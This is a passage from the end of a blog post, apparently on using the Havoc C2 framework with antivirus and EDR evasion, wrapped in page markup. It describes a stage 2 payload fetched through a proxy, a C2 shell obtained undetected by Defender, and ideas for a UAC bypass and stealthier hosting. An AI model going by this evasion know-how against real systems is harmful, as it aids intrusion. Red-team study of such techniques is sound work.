https://miro.medium.com/v2/resize:fit:1100/1*v3jQ80nj4SypfWrQ8-1bOQ.png 1100w, https://miro.medium.com/v2/resize:fit:1162/1*v3jQ80nj4SypfWrQ8-1bOQ.png 1162w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 581px"><img alt="" class="bi mn re c" width="581" height="89" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:581/1*v3jQ80nj4SypfWrQ8-1bOQ.png"></picture></div></figure><p id="ba11" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Then the stage 2 payload is downloaded through the proxy server using port 8443.</p></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr rx"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*sUMNosew42vWh24NZOdIfQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*sUMNosew42vWh24NZOdIfQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*sUMNosew42vWh24NZOdIfQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*sUMNosew42vWh24NZOdIfQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*sUMNosew42vWh24NZOdIfQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*sUMNosew42vWh24NZOdIfQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*sUMNosew42vWh24NZOdIfQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*sUMNosew42vWh24NZOdIfQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="58" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*sUMNosew42vWh24NZOdIfQ.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="ce8e" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">And we receive a Havoc C2 shell. All with defender running and not detecting anything in real time or from a system file scan.</p></div></div><div class="qk"><div class="ac ci"><div class="mi ql mj qm mk qn cm qo cn qp cp bi"><figure class="qt qu qv qw qx qk qy qz paragraph-image"><div role="button" tabindex="0" class="ra rb fr rc bi rd"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="qq qr ry"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*03bC8d5WaF4NBaAlTWZw4w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*03bC8d5WaF4NBaAlTWZw4w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*03bC8d5WaF4NBaAlTWZw4w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*03bC8d5WaF4NBaAlTWZw4w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*03bC8d5WaF4NBaAlTWZw4w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*03bC8d5WaF4NBaAlTWZw4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*03bC8d5WaF4NBaAlTWZw4w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*03bC8d5WaF4NBaAlTWZw4w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn re c" width="1000" height="454" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*03bC8d5WaF4NBaAlTWZw4w.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="5d43" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">There’s other ways to make my PowerShell script stealthier against EDR, but this will bypass most AV. Here you can see I’m in a medium integrity shell but vboxuser is a member of the administrators group. We could perform some UAC bypass to get to a high integrity shell fairly easily especially if we have credentials. Incorporating encryption into all my notstrange.ps1 web requests with a multi/listener would be beneficial or even hosting it all on PageKite which might look less suspicious than my proxy IP hosting everything. Try it out! I hope you enjoyed this post!</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="rz sa ac ju"><div class="py ac"><a class="sb ak ao aq" rel="noopener follow" href="https://medium.com/tag/cybersecurity?source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><div class="sc fr de sd gv se sf bg b bh ab bl gc">Cybersecurity</div></a></div><div class="py ac"><a class="sb ak ao aq" rel="noopener follow" href="https://medium.com/tag/networking?source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><div class="sc fr de sd gv se sf bg b bh ab bl gc">Networking</div></a></div><div class="py ac"><a class="sb ak ao aq" rel="noopener follow" href="https://medium.com/tag/programming?source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><div class="sc fr de sd gv se sf bg b bh ab bl gc">Programming</div></a></div><div class="py ac"><a class="sb ak ao aq" rel="noopener follow" href="https://medium.com/tag/c-sharp-programming?source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><div class="sc fr de sd gv se sf bg b bh ab bl gc">C Sharp Programming</div></a></div></div></div></div><div class="m"></div><div class="sv m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac jh jf jd sw sx"><div class="sy sz ta tb tc td te tf tg th ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by ti tj de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m ti tj fw o ak tk"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by tl tm de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m tl tm fw o ak tk"></div></div></a></div><div class="k j e tn cb"><div class="ac"><button class="vf zl aq ac ci r zr lc zs" style="border: 1px solid rgb(36, 36, 36);"><span class="bg b bh ab bl bi"><span class="bn zp">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="to tp tq qm ql m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--d3ac83589e3a---------------------------------------" data-discover="true"><h2 class="pw-author-name bg ts tt tu tv tw tx ty np ou ov nt ox oy nx pa pb bl"><span class="he tr">Written by Sam Rothlisberger</span></h2></a><div class="py ac jj"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--d3ac83589e3a---------------------------------------" data-discover="true">1K followers</a></span></div><div class="bg b bh ab eb ac tz"><span class="ua m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--d3ac83589e3a---------------------------------------" data-discover="true">5 following</a></div></div><div class="ub m"><p class="bg b bh ab bl">CompTIA Security+ Practice Questions : <a class="ah ai aj fo al am an ao ap aq ar as at rg hf he" href="https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE" rel="noopener  ugc nofollow">https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE</a></p></div></div></div><div class="i l"><div class="ac"><button class="vf zl aq ac ci r zr lc zs" style="border: 1px solid rgb(36, 36, 36);"><span class="bg b bh ab bl bi"><span class="bn zp">Follow</span></span></button></div></div></div></div></div></div><div class="uc ud ue uf ug m"><div class="uh bi s sv"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg ts ui il op uj io os uk ul um un uo up uq ur us bl">Responses (1)</h2><div class="ac ut"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="uu uv" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--d3ac83589e3a---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="uw ux uy uz va vb vc m"><div><div class="bg b bh ab bl"><div class="yt"><div class="zb m"><div class="zc ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak tk"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv yu yv"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-2-d3ac83589e3a&amp;source=---post_responses--d3ac83589e3a---------------------respond_sidebar------------------" data-discover="true"><div class="wx m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw yw eb ac yx xx yy"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="zd ze zf zg bq mh ci zh zi zj" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="zd ze zf zg bq mh ci zh zi zj" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="yz tn ac yx xx yy"><div class="za"><button class="bg b ec ab bl zk ve vf vg mg md vh fc fd fe vi vj vk fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab xk zk xl xm xn xo vh fc fd xp xq xr fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="ux m"><div class="bi ed"><div class="zt zu m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="75" aria-labelledby="75" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@tylerforbes9799?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Tylerforbes" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/0*F8lT47kyljMZBBSt"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="zv m"><div class="ac r"><div><div class="bn" aria-describedby="76" aria-labelledby="76" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r zw zx" rel="noopener follow" href="https://medium.com/@tylerforbes9799?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------" data-discover="true"><div class="ac jj zw"><p class="bg b bh ab ga zy pt pu zz pw aba px bl">Tylerforbes</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@tylerforbes9799/another-banger-keep-it-up-854058e70195?source=post_page---post_responses--d3ac83589e3a----0-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Feb 5, 2024</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="abb m he"><pre class="tz"><div class="abc m"><div class="bg b bh ab bl"><div class="yt">Another banger!!! Keep it up</div></div></div></pre></div><div class="abd ac r ld cw"><div class="ac r ae"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F854058e70195&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40tylerforbes9799%2Fanother-banger-keep-it-up-854058e70195&amp;user=Tylerforbes&amp;userId=b708f1e7727&amp;source=---post_responses--854058e70195----0-----------------respond_sidebar------------------" data-discover="true"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><p class="bg b ec ab eb">1</p></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at rg">Reply</button></p></div></div></div></div></div></div></div></div><div class="vq vr vs vt vu m bx"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="abe abf dt du dv ub m"><h2 class="bg ts ui il op uj io os uk ul um un uo up uq ur us bl">More from Sam Rothlisberger</h2></div><div class="abg ac ld ju abh abi abj abk abl abm abn abo abp abq abr abs abt abu abv"><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b" tabindex="0"><div class="adh"><div aria-label="Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)"><div class="adj adk adl adm cc"><img alt="Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@sam.rothlisberger/manual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f" tabindex="0"><div class="adh"><div aria-label="Manual Indirect Syscalls and Obfuscation for Shellcode Execution"><div class="adj adk adl adm cc"><img alt="Manual Indirect Syscalls and Obfuscation for Shellcode Execution" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*DNJpzMlZrBtf8kiTj7d6cw.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@sam.rothlisberger/icmp-echo-request-data-exfiltration-f41f59fcf87a" tabindex="0"><div class="adh"><div aria-label="ICMP Echo Request Data Exfiltration"><div class="adj adk adl adm cc"><img alt="ICMP Echo Request Data Exfiltration" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*g0uL5eWFv_66LpEN5IZiXA.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b" tabindex="0"><div class="adh"><div aria-label="AMSI Bypass Memory Patch Technique in 2024"><div class="adj adk adl adm cc"><img alt="AMSI Bypass Memory Patch Technique in 2024" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*YGwVi4Rkj2HBQyyC5bAbUQ.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div></div><div class="uh bi vv dr ds aga agb agc"></div><div class="ac sx sw jd jf jh"><a class="bg b bh ab bl sc ve vf vg mg md vh fc fd fe vi vj vk fh vl vm vn vo vp fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--d3ac83589e3a---------------------------------------" data-discover="true"><div class="m fm">See all from Sam Rothlisberger</div></a></div></div></div><div class="uh bi vv agd age agf agg agh"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="agi agj m"><h2 class="bg ts ui il op uj io os uk ul um un uo up uq ur us bl">Recommended from Medium</h2><div class="qt qu qv qw qx m"><div class="abg ac ld ju abh abi abj abk abl abm abn abo abp abq abr abs abt abu abv"><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@luisgerardomoret_69654/modifying-godpotato-to-evade-antivirus-f066aa779cf9" tabindex="0"><div class="adh"><div aria-label="Modifying GodPotato to Evade Antivirus"><div class="adj adk adl adm cc"><img alt="Modifying GodPotato to Evade Antivirus" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*ZBfU29N4K48f1_FpL9HHCA.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@verlekarsachin/you-wouldnt-wanna-escape-this-security-ni8mare-exploiting-n8n-cve-2026-21858-cve-2025-68613-615064b8f942" tabindex="0"><div class="adh"><div aria-label="You wouldn’t wanna escape this security ni8mare: Exploiting n8n CVE-2026–21858 &amp; CVE-2025–68613"><div class="adj adk adl adm cc"><img alt="You wouldn’t wanna escape this security ni8mare: Exploiting n8n CVE-2026–21858 &amp; CVE-2025–68613" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*00OxSrJCokwkyTGq2SfbyA.jpeg"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div></div></div><div class="abg ac ld ju abh abi abj abk abl abm abn abo abp abq abr abs abt abu abv"><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@verylazytech/13-techniques-to-stay-undetected-in-corporate-networks-master-stealthy-pentesting-like-a-pro-4a70120a9062" tabindex="0"><div class="adh"><div aria-label="13 Techniques to Stay Undetected in Corporate Networks: Master Stealthy Pentesting Like a Pro"><div class="adj adk adl adm cc"><img alt="13 Techniques to Stay Undetected in Corporate Networks: Master 